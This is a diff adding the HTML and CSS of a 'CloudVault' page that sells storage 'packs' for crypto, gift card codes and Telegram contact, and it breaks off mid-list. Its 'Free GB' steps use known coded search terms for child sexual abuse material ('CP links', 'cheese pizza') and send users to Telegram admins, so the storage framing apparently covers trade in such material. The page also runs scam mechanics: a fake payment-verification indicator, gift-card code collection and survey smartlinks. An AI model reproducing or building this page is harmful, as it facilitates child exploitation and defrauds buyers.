@@ -1,0 +1,1315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CloudVault — Secure since 2021</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&display=swap');
+
+  :root {
+    --green: #00ff88;
+    --green-dim: #00cc6a;
+    --green-dark: #00884d;
+    --green-glow: rgba(0,255,136,0.15);
+    --black: #0a0a0a;
+    --black-mid: #111111;
+    --black-card: #141414;
+    --black-hover: #1a1a1a;
+    --text: #c8c8c8;
+    --text-bright: #e8e8e8;
+    --border: rgba(0,255,136,0.12);
+    --border-hover: rgba(0,255,136,0.3);
+  }
+
+  * { margin:0; padding:0; box-sizing:border-box; }
+
+  body {
+    font-family: 'Rajdhani', sans-serif;
+    background: var(--black);
+    color: var(--text);
+    min-height: 100vh;
+    overflow-x: hidden;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* Subtle scanline overlay */
+  body::after {
+    content:'';
+    position:fixed; inset:0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.04) 2px, rgba(0,0,0,0.04) 4px);
+    pointer-events:none; z-index:9999;
+  }
+
+  /* === HEADER === */
+  header {
+    background: var(--black-mid);
+    border-bottom: 1px solid var(--border);
+    padding: 18px 24px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  .logo-dot {
+    width:10px; height:10px;
+    background: var(--green);
+    border-radius:50%;
+    box-shadow: 0 0 8px var(--green);
+    animation: pulse 2s infinite;
+  }
+  @keyframes pulse {
+    0%,100%{ opacity:1; box-shadow:0 0 8px var(--green); }
+    50%{ opacity:0.6; box-shadow:0 0 4px var(--green); }
+  }
+  .logo-text {
+    font-family:'Share Tech Mono', monospace;
+    font-size:18px;
+    color: var(--green);
+    letter-spacing:2px;
+  }
+  .logo-text span { color: var(--text); font-size:11px; margin-left:10px; opacity:0.5; }
+
+  /* === MAIN LAYOUT === */
+  .container { max-width:680px; margin:0 auto; padding:24px 16px 60px; }
+
+  /* === PRIVACY NOTICE === */
+  .privacy-bar {
+    background: rgba(0,255,136,0.06);
+    border: 1px solid var(--border);
+    border-radius:6px;
+    padding: 10px 14px;
+    font-family:'Share Tech Mono',monospace;
+    font-size:11px;
+    color: var(--green-dim);
+    margin-bottom:24px;
+    display:flex; align-items:center; gap:8px;
+  }
+  .privacy-bar svg { flex-shrink:0; }
+
+  /* === SECTION TITLES === */
+  .section-title {
+    font-family:'Share Tech Mono',monospace;
+    font-size:13px;
+    color: var(--green);
+    text-transform:uppercase;
+    letter-spacing:3px;
+    margin-bottom:14px;
+    display:flex; align-items:center; gap:10px;
+  }
+  .section-title::after {
+    content:'';
+    flex:1; height:1px;
+    background: linear-gradient(to right, var(--border), transparent);
+  }
+
+  /* === MAIN MENU === */
+  .menu-grid {
+    display: grid;
+    grid-template-columns:1fr 1fr;
+    gap:12px;
+    margin-bottom:30px;
+  }
+  .menu-btn {
+    background: var(--black-card);
+    border: 1px solid var(--border);
+    border-radius:8px;
+    padding:22px 18px;
+    cursor:pointer;
+    transition: all 0.25s;
+    text-align:left;
+  }
+  .menu-btn:hover {
+    border-color: var(--border-hover);
+    background: var(--black-hover);
+    box-shadow: 0 0 18px var(--green-glow);
+  }
+  .menu-btn .icon {
+    font-size:22px;
+    margin-bottom:8px;
+    display:block;
+  }
+  .menu-btn .title {
+    font-size:17px;
+    font-weight:600;
+    color: var(--text-bright);
+    margin-bottom:4px;
+  }
+  .menu-btn .desc {
+    font-size:12px;
+    color: rgba(200,200,200,0.5);
+    line-height:1.4;
+  }
+
+  /* === PACK CARDS === */
+  .pack-card {
+    background: var(--black-card);
+    border: 1px solid var(--border);
+    border-radius:8px;
+    padding:16px 18px;
+    margin-bottom:10px;
+    display:flex; align-items:center; justify-content:space-between;
+    cursor:pointer;
+    transition: all 0.25s;
+  }
+  .pack-card:hover {
+    border-color: var(--border-hover);
+    background: var(--black-hover);
+    box-shadow: 0 0 14px var(--green-glow);
+  }
+  .pack-left { display:flex; align-items:center; gap:14px; }
+  .pack-number {
+    font-family:'Share Tech Mono',monospace;
+    font-size:11px;
+    color: var(--green);
+    background: rgba(0,255,136,0.08);
+    border:1px solid var(--border);
+    border-radius:4px;
+    width:36px; height:36px;
+    display:flex; align-items:center; justify-content:center;
+  }
+  .pack-info .pack-name { font-size:15px; font-weight:600; color:var(--text-bright); }
+  .pack-info .pack-size { font-size:12px; color:rgba(200,200,200,0.45); margin-top:1px; }
+  .pack-price {
+    font-family:'Share Tech Mono',monospace;
+    font-size:16px;
+    color: var(--green);
+    font-weight:600;
+  }
+  .pack-card.featured {
+    border-color: var(--green-dark);
+    background: rgba(0,255,136,0.04);
+  }
+  .pack-card.featured .pack-badge {
+    font-family:'Share Tech Mono',monospace;
+    font-size:9px;
+    color:#000;
+    background:var(--green);
+    padding:2px 6px;
+    border-radius:3px;
+    margin-left:8px;
+    text-transform:uppercase;
+    letter-spacing:1px;
+  }
+
+  /* === FREE PACK LIST === */
+  .free-pack-card {
+    background: var(--black-card);
+    border: 1px solid var(--border);
+    border-radius:8px;
+    padding:16px 18px;
+    margin-bottom:10px;
+    display:flex; align-items:center; justify-content:space-between;
+    cursor:pointer;
+    transition:all 0.25s;
+  }
+  .free-pack-card:hover {
+    border-color: var(--border-hover);
+    background: var(--black-hover);
+    box-shadow:0 0 14px var(--green-glow);
+  }
+  .free-pack-card .pack-left { gap:12px; }
+  .free-pack-card .free-badge {
+    font-family:'Share Tech Mono',monospace;
+    font-size:9px; color:#000;
+    background: var(--green);
+    padding:2px 7px; border-radius:3px;
+    text-transform:uppercase; letter-spacing:1px;
+  }
+
+  /* === PAYMENT METHODS === */
+  .method-card {
+    background: var(--black-card);
+    border:1px solid var(--border);
+    border-radius:8px;
+    padding:14px 18px;
+    margin-bottom:8px;
+    display:flex; align-items:center; gap:14px;
+    cursor:pointer;
+    transition:all 0.25s;
+  }
+  .method-card:hover {
+    border-color: var(--border-hover);
+    background: var(--black-hover);
+    box-shadow: 0 0 14px var(--green-glow);
+  }
+  .method-icon {
+    width:38px; height:38px;
+    border-radius:6px;
+    display:flex; align-items:center; justify-content:center;
+    font-size:18px;
+    background: rgba(0,255,136,0.06);
+    border:1px solid var(--border);
+    flex-shrink:0;
+  }
+  .method-info .method-name { font-size:15px; font-weight:600; color:var(--text-bright); }
+  .method-info .method-desc { font-size:11px; color:rgba(200,200,200,0.45); margin-top:1px; }
+  .method-arrow { color: var(--green-dim); font-size:16px; margin-left:auto; }
+
+  /* === GIFT CARD SELECTION === */
+  .gift-grid {
+    display:grid; grid-template-columns:1fr 1fr;
+    gap:8px;
+  }
+  .gift-btn {
+    background: var(--black-card);
+    border:1px solid var(--border);
+    border-radius:7px;
+    padding:12px 10px;
+    text-align:center;
+    cursor:pointer;
+    transition:all 0.2s;
+    font-size:13px; font-weight:600; color:var(--text-bright);
+  }
+  .gift-btn:hover { border-color:var(--border-hover); background:var(--black-hover); box-shadow:0 0 12px var(--green-glow); }
+  .gift-btn .gift-icon { font-size:20px; margin-bottom:4px; display:block; }
+
+  /* === CRYPTO WALLET DISPLAY === */
+  .wallet-block {
+    background: var(--black-card);
+    border:1px solid var(--border);
+    border-radius:8px;
+    padding:16px 18px;
+    margin-bottom:10px;
+  }
+  .wallet-header {
+    display:flex; align-items:center; justify-content:space-between;
+    margin-bottom:10px;
+  }
+  .wallet-header .name {
+    font-size:15px; font-weight:600; color:var(--text-bright);
+    display:flex; align-items:center; gap:8px;
+  }
+  .wallet-header .name .coin-icon { font-size:18px; }
+  .privacy-tag {
+    font-family:'Share Tech Mono',monospace;
+    font-size:9px; color:var(--green);
+    background:rgba(0,255,136,0.1);
+    border:1px solid var(--border);
+    padding:2px 7px; border-radius:3px;
+    text-transform:uppercase; letter-spacing:1px;
+  }
+  .wallet-address {
+    font-family:'Share Tech Mono',monospace;
+    font-size:11px;
+    color: var(--green-dim);
+    background: rgba(0,0,0,0.4);
+    border:1px solid var(--border);
+    border-radius:5px;
+    padding:10px 12px;
+    word-break:break-all;
+    line-height:1.6;
+    position:relative;
+    margin-bottom:8px;
+  }
+  .copy-btn {
+    position:absolute; top:8px; right:8px;
+    background:rgba(0,255,136,0.1);
+    border:1px solid var(--border);
+    border-radius:4px;
+    padding:3px 8px;
+    font-family:'Share Tech Mono',monospace;
+    font-size:9px; color:var(--green);
+    cursor:pointer; transition:all 0.2s;
+  }
+  .copy-btn:hover { background:rgba(0,255,136,0.2); }
+  .blockchain-link {
+    font-family:'Share Tech Mono',monospace;
+    font-size:10px;
+    color: var(--green-dim);
+    text-decoration:none;
+    opacity:0.6;
+    transition:opacity 0.2s;
+  }
+  .blockchain-link:hover { opacity:1; text-decoration:underline; }
+
+  /* === INPUTS === */
+  .input-label {
+    font-family:'Share Tech Mono',monospace;
+    font-size:11px; color:var(--green-dim);
+    text-transform:uppercase; letter-spacing:1px;
+    margin-bottom:6px; display:block;
+  }
+  .input-field {
+    width:100%;
+    background: rgba(0,0,0,0.5);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:11px 14px;
+    color:var(--text-bright);
+    font-family:'Rajdhani',sans-serif;
+    font-size:15px;
+    outline:none;
+    transition:border-color 0.2s;
+    margin-bottom:14px;
+  }
+  .input-field:focus { border-color:var(--border-hover); }
+  .input-field::placeholder { color:rgba(200,200,200,0.3); }
+
+  /* === BUTTONS === */
+  .btn-primary {
+    width:100%;
+    background: var(--green);
+    color:#000;
+    border:none;
+    border-radius:6px;
+    padding:13px;
+    font-family:'Rajdhani',sans-serif;
+    font-size:16px; font-weight:700;
+    cursor:pointer;
+    transition:all 0.2s;
+    letter-spacing:1px;
+    text-transform:uppercase;
+  }
+  .btn-primary:hover { background:var(--green-dim); box-shadow:0 0 16px var(--green-glow); }
+  .btn-primary:disabled { background:var(--green-dark); opacity:0.5; cursor:not-allowed; }
+
+  .btn-secondary {
+    width:100%;
+    background:transparent;
+    color:var(--green);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:10px;
+    font-family:'Share Tech Mono',monospace;
+    font-size:12px;
+    cursor:pointer;
+    transition:all 0.2s;
+    margin-top:8px;
+  }
+  .btn-secondary:hover { border-color:var(--border-hover); background:var(--green-glow); }
+
+  .btn-back {
+    background:none; border:none;
+    color:var(--green-dim);
+    font-family:'Share Tech Mono',monospace;
+    font-size:11px; cursor:pointer;
+    padding:0; margin-bottom:18px;
+    display:flex; align-items:center; gap:6px;
+    transition:color 0.2s;
+  }
+  .btn-back:hover { color:var(--green); }
+
+  /* === PAID BUTTON (hidden, shown after delay) === */
+  .paid-btn {
+    width:100%;
+    background: rgba(0,255,136,0.08);
+    border:1px solid var(--border-hover);
+    border-radius:6px;
+    padding:13px;
+    color:var(--green);
+    font-family:'Share Tech Mono',monospace;
+    font-size:13px;
+    cursor:pointer;
+    transition:all 0.2s;
+    margin-top:14px;
+    display:none;
+    letter-spacing:1px;
+  }
+  .paid-btn:hover { background:rgba(0,255,136,0.15); box-shadow:0 0 14px var(--green-glow); }
+  .paid-btn.visible { display:block; animation:fadeIn 0.4s ease; }
+  @keyframes fadeIn { from{opacity:0;transform:translateY(6px)} to{opacity:1;transform:translateY(0)} }
+
+  /* === LOADING SPINNER === */
+  .loader-wrap {
+    text-align:center; padding:40px 0;
+  }
+  .loader {
+    width:42px; height:42px;
+    border:2px solid var(--border);
+    border-top:2px solid var(--green);
+    border-radius:50%;
+    animation:spin 0.8s linear infinite;
+    margin:0 auto 16px;
+  }
+  @keyframes spin { to{transform:rotate(360deg)} }
+  .loader-text {
+    font-family:'Share Tech Mono',monospace;
+    font-size:11px; color:var(--green-dim);
+    letter-spacing:2px; text-transform:uppercase;
+  }
+
+  /* === SURVEY MODAL === */
+  .modal-overlay {
+    display:none;
+    position:fixed; inset:0;
+    background:rgba(0,0,0,0.75);
+    z-index:100;
+    align-items:center; justify-content:center;
+    padding:20px;
+  }
+  .modal-overlay.active { display:flex; }
+  .modal {
+    background:var(--black-card);
+    border:1px solid var(--border-hover);
+    border-radius:10px;
+    padding:28px 24px;
+    max-width:420px; width:100%;
+    text-align:center;
+  }
+  .modal .modal-icon { font-size:32px; margin-bottom:10px; display:block; }
+  .modal .modal-title { font-size:18px; font-weight:700; color:var(--text-bright); margin-bottom:8px; }
+  .modal .modal-desc { font-size:13px; color:rgba(200,200,200,0.5); line-height:1.5; margin-bottom:18px; }
+  .modal .timer-ring {
+    width:64px; height:64px;
+    border:2px solid var(--border);
+    border-top:2px solid var(--green);
+    border-radius:50%;
+    margin:0 auto 8px;
+    animation:spin 1s linear infinite;
+  }
+  .modal .timer-num {
+    font-family:'Share Tech Mono',monospace;
+    font-size:28px; color:var(--green);
+    margin-bottom:14px;
+  }
+  .modal .smartlink-btn {
+    background:var(--green); color:#000; border:none;
+    border-radius:6px; padding:12px 28px;
+    font-family:'Rajdhani',sans-serif;
+    font-size:15px; font-weight:700;
+    cursor:pointer; transition:all 0.2s;
+    display:none; margin:0 auto;
+  }
+  .modal .smartlink-btn:hover { background:var(--green-dim); }
+  .modal .smartlink-btn.visible { display:inline-block; }
+  .modal .close-modal {
+    background:none; border:none;
+    color:rgba(200,200,200,0.4);
+    font-size:11px; cursor:pointer;
+    margin-top:12px; font-family:'Share Tech Mono',monospace;
+    transition:color 0.2s;
+  }
+  .modal .close-modal:hover { color:var(--green-dim); }
+
+  /* === SUCCESS STATE === */
+  .success-block { text-align:center; padding:30px 0; }
+  .success-block .s-icon { font-size:42px; margin-bottom:12px; display:block; }
+  .success-block .s-title { font-size:19px; font-weight:700; color:var(--green); margin-bottom:6px; }
+  .success-block .s-desc { font-size:13px; color:rgba(200,200,200,0.5); line-height:1.5; }
+
+  /* === CHANNELS LIST === */
+  .channel-card {
+    background:var(--black-card); border:1px solid var(--border);
+    border-radius:8px; padding:14px 18px;
+    display:flex; align-items:center; gap:12px; margin-bottom:8px;
+  }
+  .channel-icon {
+    width:38px; height:38px; border-radius:50%;
+    background:rgba(0,255,136,0.08);
+    border:1px solid var(--border);
+    display:flex; align-items:center; justify-content:center;
+    font-size:18px; flex-shrink:0;
+  }
+  .channel-info .ch-name { font-size:15px; font-weight:600; color:var(--text-bright); }
+  .channel-info .ch-handle { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--green-dim); margin-top:2px; }
+
+  /* === EARN FREE STEPS === */
+  .step-item {
+    display:flex; gap:14px; align-items:flex-start;
+    margin-bottom:16px;
+  }
+  .step-num {
+    font-family:'Share Tech Mono',monospace;
+    font-size:12px; color:var(--green);
+    background:rgba(0,255,136,0.08);
+    border:1px solid var(--border);
+    border-radius:50%; width:30px; height:30px;
+    display:flex; align-items:center; justify-content:center;
+    flex-shrink:0;
+  }
+  .step-text { font-size:14px; color:var(--text); line-height:1.5; padding-top:3px; }
+  .step-text strong { color:var(--text-bright); }
+
+  .note-box {
+    background:rgba(0,255,136,0.04);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:12px 14px;
+    font-size:12px; color:rgba(200,200,200,0.5);
+    line-height:1.5;
+    margin-top:14px;
+  }
+  .note-box strong { color:var(--green-dim); }
+
+  /* === CRYPTO VERIFICATION PULSE === */
+  .verify-dot {
+    display:inline-block;
+    width:8px; height:8px;
+    background:var(--green);
+    border-radius:50%;
+    box-shadow:0 0 6px var(--green);
+    animation: pulse 2s infinite;
+    margin-right:6px;
+  }
+  .verify-label {
+    font-family:'Share Tech Mono',monospace;
+    font-size:10px; color:var(--green-dim);
+    margin-top:6px; display:flex; align-items:center;
+  }
+
+  /* === HIDDEN SCREENS === */
+  .screen { display:none; }
+  .screen.active { display:block; animation:fadeIn 0.3s ease; }
+
+  /* === FOOTER NOTE === */
+  .footer-note {
+    text-align:center;
+    font-family:'Share Tech Mono',monospace;
+    font-size:10px; color:rgba(200,200,200,0.25);
+    margin-top:30px; line-height:1.6;
+  }
+
+  /* Spacing helpers */
+  .mt6{margin-top:6px} .mt10{margin-top:10px} .mt14{margin-top:14px} .mt18{margin-top:18px} .mb6{margin-bottom:6px} .mb10{margin-bottom:10px} .mb14{margin-bottom:14px} .mb18{margin-bottom:18px}
+  .half-grid { display:grid; grid-template-columns:1fr 1fr; gap:8px; }
+
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header>
+  <div class="logo-dot"></div>
+  <div class="logo-text">CLOUDVAULT <span>v2.4 — encrypted and safe</span></div>
+</header>
+
+<div class="container">
+
+  <!-- PRIVACY BAR -->
+  <div class="privacy-bar">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+    We do not log IP addresses or personal data. Only payment transactions are tracked for order fulfillment. Your privacy is our priority.
+  </div>
+
+  <!-- ========== SCREEN: MAIN MENU ========== -->
+  <div id="screen-main" class="screen active">
+    <div class="section-title">Choose an option</div>
+    <div class="menu-grid">
+      <div class="menu-btn" onclick="goTo('screen-packs')">
+        <span class="icon">📦</span>
+        <div class="title">Packs</div>
+        <div class="desc">Purchase a pack using crypto, gift cards, or PayPal.</div>
+      </div>
+      <div class="menu-btn" onclick="goTo('screen-free-earn')">
+        <span class="icon">✨</span>
+        <div class="title">Free GB</div>
+        <div class="desc">Earn free storage by completing simple tasks.</div>
+      </div>
+      <div class="menu-btn" onclick="goTo('screen-free-packs')">
+        <span class="icon">🎁</span>
+        <div class="title">Free Packs</div>
+        <div class="desc">Download free packs — just complete a quick survey.</div>
+      </div>
+      <div class="menu-btn" onclick="goTo('screen-channels')">
+        <span class="icon">📢</span>
+        <div class="title">Channels</div>
+        <div class="desc">View all official channels and communities.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== SCREEN: PACKS ========== -->
+  <div id="screen-packs" class="screen">
+    <button class="btn-back" onclick="goTo('screen-main')">← Back</button>
+    <div class="section-title">Storage Packs</div>
+
+    <div id="pack-list">
+      <div class="pack-card" onclick="selectPack(0)">
+        <div class="pack-left">
+          <div class="pack-number">01</div>
+          <div class="pack-info">
+            <div class="pack-name">Pack 1</div>
+            <div class="pack-size">50 GB storage</div>
+          </div>
+        </div>
+        <div class="pack-price">$10</div>
+      </div>
+      <div class="pack-card" onclick="selectPack(1)">
+        <div class="pack-left">
+          <div class="pack-number">02</div>
+          <div class="pack-info">
+            <div class="pack-name">Pack 2</div>
+            <div class="pack-size">120 GB storage</div>
+          </div>
+        </div>
+        <div class="pack-price">$25</div>
+      </div>
+      <div class="pack-card featured" onclick="selectPack(2)">
+        <div class="pack-left">
+          <div class="pack-number">03</div>
+          <div class="pack-info">
+            <div class="pack-name" style="display:flex;align-items:center;">Pack 3 <span class="pack-badge">Popular</span></div>
+            <div class="pack-size">500 GB storage</div>
+          </div>
+        </div>
+        <div class="pack-price">$60</div>
+      </div>
+      <div class="pack-card" onclick="selectPack(3)">
+        <div class="pack-left">
+          <div class="pack-number">04</div>
+          <div class="pack-info">
+            <div class="pack-name">Pack 4</div>
+            <div class="pack-size">2.1 TB storage</div>
+          </div>
+        </div>
+        <div class="pack-price">$150</div>
+      </div>
+      <div class="pack-card" onclick="selectPack(4)">
+        <div class="pack-left">
+          <div class="pack-number">05</div>
+          <div class="pack-info">
+            <div class="pack-name">Mega Cloud Folder</div>
+            <div class="pack-size">5 TB storage</div>
+          </div>
+        </div>
+        <div class="pack-price">$230</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== SCREEN: PAYMENT METHOD ========== -->
+  <div id="screen-payment" class="screen">
+    <button class="btn-back" onclick="goTo('screen-packs')">← Back</button>
+    <div class="section-title">Payment Method</div>
+    <div id="selected-pack-summary" style="background:var(--black-card);border:1px solid var(--border);border-radius:8px;padding:12px 16px;margin-bottom:20px;display:flex;align-items:center;justify-content:space-between;">
+      <span style="font-size:14px;color:var(--text-bright);font-weight:600;" id="summary-name">Pack 1 — 50 GB</span>
+      <span style="font-family:'Share Tech Mono',monospace;color:var(--green);font-size:15px;" id="summary-price">$10</span>
+    </div>
+
+    <!-- Telegram Username Input -->
+    <label class="input-label">Your Telegram Username</label>
+    <input type="text" class="input-field" id="tg-username" placeholder="@yourusername">
+
+    <div class="method-card" onclick="goTo('screen-crypto')">
+      <div class="method-icon">🪙</div>
+      <div class="method-info">
+        <div class="method-name">Cryptocurrency</div>
+        <div class="method-desc">BTC · ETH · XMR · SOL · USDT (ERC-20)</div>
+      </div>
+      <div class="method-arrow">›</div>
+    </div>
+    <div class="method-card" onclick="goTo('screen-giftcards')">
+      <div class="method-icon">🎁</div>
+      <div class="method-info">
+        <div class="method-name">Gift Cards</div>
+        <div class="method-desc">PayPal Rewardable · Mastercard · Riot · Roblox · Fortnite</div>
+      </div>
+      <div class="method-arrow">›</div>
+    </div>
+    <div class="method-card" onclick="goTo('screen-paypal')">
+      <div class="method-icon">💳</div>
+      <div class="method-info">
+        <div class="method-name">PayPal</div>
+        <div class="method-desc">Via PayPal Rewardable gift cards</div>
+      </div>
+      <div class="method-arrow">›</div>
+    </div>
+  </div>
+
+  <!-- ========== SCREEN: CRYPTO ========== -->
+  <div id="screen-crypto" class="screen">
+    <button class="btn-back" onclick="goTo('screen-payment')">← Back</button>
+    <div class="section-title">Select Crypto</div>
+
+    <div class="note-box" style="margin-bottom:18px;">
+      <strong>🔒 Best privacy:</strong> Use <strong style="color:var(--green)">Monero (XMR)</strong> or <strong style="color:var(--green)">Bitcoin (BTC)</strong> for maximum anonymity. Monero uses ring signatures and stealth addresses — untraceable by default.
+    </div>
+
+    <div id="crypto-selection">
+      <div class="method-card" onclick="showWallet('xmr')">
+        <div class="method-icon">🛡️</div>
+        <div class="method-info">
+          <div class="method-name">Monero <span class="privacy-tag" style="margin-left:6px;">Best Privacy</span></div>
+          <div class="method-desc">XMR — Untraceable · Ring signatures</div>
+        </div>
+        <div class="method-arrow">›</div>
+      </div>
+      <div class="method-card" onclick="showWallet('btc')">
+        <div class="method-icon">₿</div>
+        <div class="method-info">
+          <div class="method-name">Bitcoin <span class="privacy-tag" style="margin-left:6px;">High Privacy</span></div>
+          <div class="method-desc">BTC — Pseudonymous · Lightning support</div>
+        </div>
+        <div class="method-arrow">›</div>
+      </div>
+      <div class="method-card" onclick="showWallet('eth')">
+        <div class="method-icon">⬡</div>
+        <div class="method-info">
+          <div class="method-name">Ethereum</div>
+          <div class="method-desc">ETH — Smart contracts · USDT (ERC-20)</div>
+        </div>
+        <div class="method-arrow">›</div>
+      </div>
+      <div class="method-card" onclick="showWallet('usdt')">
+        <div class="method-icon">💵</div>
+        <div class="method-info">
+          <div class="method-name">USDT via Ethereum</div>
+          <div class="method-desc">Tether · ERC-20 token · Stable value</div>
+        </div>
+        <div class="method-arrow">›</div>
+      </div>
+      <div class="method-card" onclick="showWallet('sol')">
+        <div class="method-icon">◐</div>
+        <div class="method-info">
+          <div class="method-name">Solana</div>
+          <div class="method-desc">SOL — Fast · Low fees</div>
+        </div>
+        <div class="method-arrow">›</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== SCREEN: WALLET DETAIL ========== -->
+  <div id="screen-wallet" class="screen">
+    <button class="btn-back" onclick="goTo('screen-crypto')">← Back</button>
+    <div class="section-title" id="wallet-title">Send Payment</div>
+
+    <div id="wallet-detail"></div>
+
+    <div class="verify-label">
+      <span class="verify-dot"></span>
+      Blockchain address verified · Checking every 2 seconds
+    </div>
+
+    <div id="paid-btn-crypto" class="paid-btn" onclick="handleCryptoPaid()">
+      ✓ I've already paid
+    </div>
+  </div>
+
+  <!-- ========== SCREEN: CRYPTO CONFIRMATION ========== -->
+  <div id="screen-crypto-confirm" class="screen">
+    <div class="success-block" style="padding-top:20px;">
+      <span class="s-icon">🔍</span>
+      <div class="s-title">Verification Pending</div>
+      <div class="s-desc" style="max-width:340px;margin:0 auto 20px;">
+        A random verification amount will be sent to your crypto address. The <strong style="color:var(--green)">first 4 digits</strong> of that amount are your unique key.<br><br>
+        You will receive the download link via Telegram (from the bot or directly from the admin).
+      </div>
+    </div>
+    <div class="loader-wrap">
+      <div class="loader"></div>
+      <div class="loader-text">Awaiting admin confirmation</div>
+    </div>
+    <button class="btn-secondary" onclick="goTo('screen-main')">Return to main menu</button>
+  </div>
+
+  <!-- ========== SCREEN: GIFT CARDS ========== -->
+  <div id="screen-giftcards" class="screen">
+    <button class="btn-back" onclick="goTo('screen-payment')">← Back</button>
+    <div class="section-title">Select Gift Card Type</div>
+    <div class="gift-grid">
+      <div class="gift-btn" onclick="selectGiftCard('paypal')">
+        <span class="gift-icon">💳</span>PayPal Rewardable
+      </div>
+      <div class="gift-btn" onclick="selectGiftCard('riot')">
+        <span class="gift-icon">🎮</span>Riot Games
+      </div>
+      <div class="gift-btn" onclick="selectGiftCard('roblox')">
+        <span class="gift-icon">🧱</span>Roblox
+      </div>
+      <div class="gift-btn" onclick="selectGiftCard('fortnite')">
+        <span class="gift-icon">⚔️</span>Fortnite
+      </div>
+      <div class="gift-btn" onclick="selectGiftCard('mastercard')">
+        <span class="gift-icon">💎</span>Virtual Mastercard
+      </div>
+      <div class="gift-btn" onclick="selectGiftCard('custom')">
+        <span class="gift-icon">✏️</span>Custom
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== SCREEN: GIFT CARD INPUT ========== -->
+  <div id="screen-giftcard-input" class="screen">
+    <button class="btn-back" onclick="goTo('screen-giftcards')">← Back</button>
+    <div class="section-title" id="gc-title">Enter Gift Card</div>
+
+    <div id="gc-custom-type" style="display:none; margin-bottom:14px;">
+      <label class="input-label">Gift Card Type</label>
+      <input type="text" class="input-field" id="gc-custom-name" placeholder="e.g. Amazon, Steam, etc.">
+    </div>
+
+    <label class="input-label">Gift Card Code</label>
+    <input type="text" class="input-field" id="gc-code" placeholder="Enter your gift card code here">
+
+    <button class="btn-primary" onclick="submitGiftCard()">Submit Gift Card</button>
+  </div>
+
+  <!-- ========== SCREEN: GIFT CARD LOADING ========== -->
+  <div id="screen-gc-loading" class="screen">
+    <div class="loader-wrap" style="padding-top:40px;">
+      <div class="loader"></div>
+      <div class="loader-text">Verifying gift card</div>
+      <div style="font-size:12px;color:rgba(200,200,200,0.35);margin-top:12px;text-align:center;">
+        Our team is reviewing your submission. Please wait.
+      </div>
+    </div>
+    <button class="btn-secondary" onclick="goTo('screen-main')" style="margin-top:30px;">Return to main menu</button>
+  </div>
+
+  <!-- ========== SCREEN: PAYPAL ========== -->
+  <div id="screen-paypal" class="screen">
+    <button class="btn-back" onclick="goTo('screen-payment')">← Back</button>
+    <div class="section-title">PayPal Payment</div>
+    <div class="note-box" style="margin-bottom:18px;">
+      PayPal payments are processed via <strong>PayPal Rewardable gift cards</strong>. Please purchase the appropriate gift card and enter the code below.
+    </div>
+    <label class="input-label">PayPal Gift Card Code</label>
+    <input type="text" class="input-field" id="paypal-code" placeholder="Enter your PayPal gift card code">
+    <button class="btn-primary" onclick="submitPayPal()">Submit Payment</button>
+  </div>
+
+  <!-- ========== SCREEN: FREE EARN (Steps) ========== -->
+  <div id="screen-free-earn" class="screen">
+    <button class="btn-back" onclick="goTo('screen-main')">← Back</button>
+    <div class="section-title">✨ Free GB — Earn Storage</div>
+
+    <div class="step-item">
+      <div class="step-num">1</div>
+      <div class="step-text"><strong>Subscribe to the channel</strong> — Without this step, the free link will not be provided.</div>
+    </div>
+    <div class="step-item">
+      <div class="step-num">2</div>
+      <div class="step-text">Type <strong>"/CPlinks [cyplink, club penguin, or cheese pizza"</strong> in the TikTok search bar.</div>
+    </div>
+    <div class="step-item">
+      <div class="step-num">3</div>
+      <div class="step-text">Open the video related to this topic from the results.</div>
+    </div>
+    <div class="step-item">
+      <div class="step-num">4</div>
+      <div class="step-text">Search for <strong>@cookiecpnew</strong> on Telegram or open the direct link.</div>
+    </div>
+    <div class="step-item">
+      <div class="step-num">5</div>
+      <div class="step-text">Write a comment on <strong>15 videos</strong>, like each of your own comments, and take a <strong>screenshot</strong> of each.</div>
+    </div>
+    <div class="step-item">
+      <div class="step-num">6</div>
+      <div class="step-text">Collect all <strong>15 screenshots</strong> as proof of completion.</div>
+    </div>
+
+    <div class="note-box">
+      <strong>Final step:</strong> Send all 15 screenshots to the admin <strong style="color:var(--green);">@penizky</strong> on Telegram for verification. Once confirmed, you'll receive your free storage link.
+    </div>
+
+    <div class="section-title mt18">Official Channels</div>
+    <div class="channel-card">
+      <div class="channel-icon">🍪</div>
+      <div class="channel-info">
+        <div class="ch-name">CookiecpNew</div>
+        <div class="ch-handle">@cookiecpnew — Telegram</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== SCREEN: FREE PACKS ========== -->
+  <div id="screen-free-packs" class="screen">
+    <button class="btn-back" onclick="goTo('screen-main')">← Back</button>
+    <div class="section-title">🎁 Free Packs</div>
+
+    <div class="note-box" style="margin-bottom:18px;">
+      <strong>How it works:</strong> Click a free pack below. A quick survey will appear — complete it to unlock your download. We do not log anything; only the survey provider does.<br><br>
+      <strong style="color:var(--green);">💡 Tip:</strong> Complete at least <strong>10 surveys</strong> from one smartlink to earn a <strong>free Pack 3 (500 GB)</strong>.
+    </div>
+
+    <div class="free-pack-card" onclick="triggerFreePack(0)">
+      <div class="pack-left">
+        <div class="pack-number" style="background:rgba(0,255,136,0.1);">🎁</div>
+        <div class="pack-info">
+          <div class="pack-name">Free Pack A</div>
+          <div class="pack-size">34 GB storage</div>
+        </div>
+      </div>
+      <span class="free-badge">FREE</span>
+    </div>
+    <div class="free-pack-card" onclick="triggerFreePack(1)">
+      <div class="pack-left">
+        <div class="pack-number" style="background:rgba(0,255,136,0.1);">🎁</div>
+        <div class="pack-info">
